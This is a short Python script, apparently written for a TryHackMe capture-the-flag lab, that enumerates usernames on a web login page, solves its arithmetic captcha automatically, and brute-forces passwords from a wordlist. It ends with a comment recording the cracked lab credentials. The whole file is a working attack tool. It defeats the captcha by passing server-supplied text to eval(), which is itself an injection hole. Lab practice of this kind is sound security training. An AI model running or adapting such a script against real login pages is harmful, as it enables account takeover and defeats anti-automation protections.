import requests,re
ip = "10.10.143.15" #thmBoxIp
url = "http://"+ip+"/login"
regular_expression = ""
regex = re.compile(r"(\d+\s[+*\/-]\s\d+)\s=\s\?")

def captcha_solve(response):
    captcha = re.findall(regex,response.text)[0]
    captcha_sum = eval(captcha)
    return captcha,captcha_sum

def send_post(username,password):
    data = {
    "username":username,
    "password":password
    }
    response = requests.post(url=url,data=data)
    captcha,captcha_sum = captcha_solve(response)
    if captcha in response.text:
        print(f"Capctha has been found and trying to solve with {captcha} and {captcha_sum}")
        data.update({"captcha":captcha_sum})
        response_captcha = requests.post(url=url,data=data)
        return response_captcha
    else:
        return response

with open('usernames.txt',"rt") as file: # t -> refers to text mode
    usernames = file.read().splitlines() # splitlines() -> makes a list from the above list
with open('passwords.txt','rt') as file:
    passwords = file.read().splitlines()

for username in usernames:
    response = send_post(username,"123")
    print(f"Username : {username} has been tried.")
    if not "does not exist" in response.text:
        print(f"Username : {username} has found.")
        for password in passwords:
            response = send_post(username,password)
            print(f"Username: {username} and Password : {password} has been tried.")
            if not "Error" in response.text:
                print(f"Success! Username:{username} Password:{password}")
                exit(0)
            else:
                pass
    elif "Invalid captcha" in response.text:
        print("[!] Captcha failed")


# Success! Username:natalie Password:sk8board

# cora

